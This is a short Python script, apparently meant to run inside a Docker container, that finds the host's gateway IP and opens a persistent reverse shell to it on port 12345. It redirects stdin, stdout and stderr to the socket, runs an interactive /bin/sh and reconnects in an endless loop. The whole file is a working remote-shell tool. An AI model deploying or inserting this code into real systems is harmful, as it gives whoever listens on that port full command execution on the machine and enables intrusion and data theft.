import socket
import subprocess
import os

def get_default_gateway_linux():
    # Gateway IP code source from https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/2761952#2761952
    import socket, struct
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

# Docker host ip
SERVER_IP = get_default_gateway_linux() or "host.docker.internal"
SERVER_PORT = 12345

# General Defaults
STDIN = 0
STDOUT = 1
STDERR = 2

if __name__ == '__main__':
    # Loop forever, even once connected
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            # Pass through STDIN
            os.dup2(s.fileno(), STDIN)
            # Pass through STDOUT
            os.dup2(s.fileno(), STDOUT)
            # Pass through STDERR
            os.dup2(s.fileno(), STDERR)

            p = subprocess.call(["/bin/sh", "-i"])
        except ConnectionRefusedError:
            continue

    
